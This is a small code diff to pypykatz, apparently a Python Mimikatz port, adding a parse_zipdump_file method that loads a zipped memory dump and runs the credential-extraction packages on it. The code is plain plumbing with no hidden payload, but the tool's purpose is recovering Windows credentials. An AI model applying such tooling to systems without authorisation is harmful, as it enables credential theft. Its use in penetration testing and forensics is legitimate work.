@@ -132,6 +132,15 @@ class pypykatz:
 		mimi = pypykatz(reader.get_buffered_reader(), sysinfo)
 		mimi.start(packages)
 		return mimi
+	
+	@staticmethod
+	def parse_zipdump_file(filename, packages = ['all']):
+		from pypykatz.commons.readers.zipdump.reader import ZipDumpReader
+		reader = ZipDumpReader.from_file(filename)
+		sysinfo = KatzSystemInfo.from_live_reader(reader)
+		mimi = pypykatz(reader.get_buffered_reader(), sysinfo)
+		mimi.start(packages)
+		return mimi
 		
 	@staticmethod
 	def parse_minidump_file(filename, packages = ['all'], chunksize = 10*1024):
